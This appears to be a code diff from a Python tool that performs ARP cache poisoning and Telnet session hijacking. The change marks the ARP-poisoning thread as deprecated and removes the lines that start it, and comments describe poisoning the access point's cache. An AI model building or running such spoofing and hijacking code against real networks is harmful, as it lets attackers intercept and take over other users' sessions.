@@ -240,6 +240,7 @@ def sniffOnConn():
 #We use this thread to continously send Gratuitous ARP-s (Arp replies on ff:ff:ff:ff:ff:ff)
 #This way, we can poison the arp cache of the hosts on the network -> We only need to poison the cache of the Access Point(Switch)
 #Could make it less noisy.
+#Deprecated
 
 def arpPoisonThread(spoofIp, destIp):
     #Sending gratuitous arp-reply on broadcast
@@ -314,19 +315,9 @@ def hijackTelnet(interface):
     clientMac = getMacByIp(conn.ClientAddr,interface)
     print("Client Mac is:"+str(clientMac))
     
-    #Start a separate thread to poison the ARP cache
-    print("Launching a new thread to poison the arp cahce")
-    flagArpSpoofer = True
-    spoofThread = threading.Thread(target=arpPoisonThread, args=(conn.ClientAddr,conn.ServerAddr))
-    spoofThread.start()
 
     #Start a communication session on TELNET3
     comOnTelnet(conn)
-
-
-    flagArpSpoofer=False
-    spoofThread.join()
-    print("Joined the thread responsible for arp cache")
 
 
 def writeToTelnet(interface):
